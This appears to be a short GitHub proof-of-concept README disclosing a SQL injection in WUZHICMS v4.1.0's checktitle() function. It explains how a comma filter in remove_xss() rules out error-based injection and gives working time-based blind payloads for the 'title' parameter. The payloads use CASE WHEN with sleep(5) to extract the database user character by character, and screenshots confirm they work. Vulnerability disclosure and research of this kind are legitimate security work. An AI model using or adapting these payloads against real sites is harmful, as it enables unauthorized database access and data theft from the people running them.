# WUZHICMS-SQL-Injection
---
### WUZHICMS v4.1.0 function checktitle() in /coreframe/app/content/admin/content.php hava a SQL injection
- /coreframe/app/content/admin/content.php: $titile able to control,but just to bypass 
function remove_xss()
![avatar](https://github.com/SuperSalsa20/WUZHICMS-SQL-Injection/blob/master/1.png)
- /coreframe/app/core/libs/function: function remove_xss():
Filter ”,”   
Can't use SQL like [updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)]
But can use Time Blind SQL Injection
![avatar](https://github.com/SuperSalsa20/WUZHICMS-SQL-Injection/blob/master/2.png)
- Find the injection point in web site
![avatar](https://github.com/SuperSalsa20/WUZHICMS-SQL-Injection/blob/master/3.png)
- findConstruction statement,if submit,we find Controllable variable “title”
![avatar](https://github.com/SuperSalsa20/WUZHICMS-SQL-Injection/blob/master/4.png)
- MySQL user:

![avatar](https://github.com/SuperSalsa20/WUZHICMS-SQL-Injection/blob/master/5.png)
- Exp:```title=123%' and case when substring((select user()) from 1 for 1)='r' then sleep(5) else 0 end  and '%'='&cid=1&id=0```
![avatar](https://github.com/SuperSalsa20/WUZHICMS-SQL-Injection/blob/master/6.png)
- ```title=123%' and case when substring((select user()) from 1 for 4)='root' then sleep(5) else 0 end  and '%'='&cid=1&id=0```
![avatar](https://github.com/SuperSalsa20/WUZHICMS-SQL-Injection/blob/master/7.png)
- sleep 5 seconds,It's works
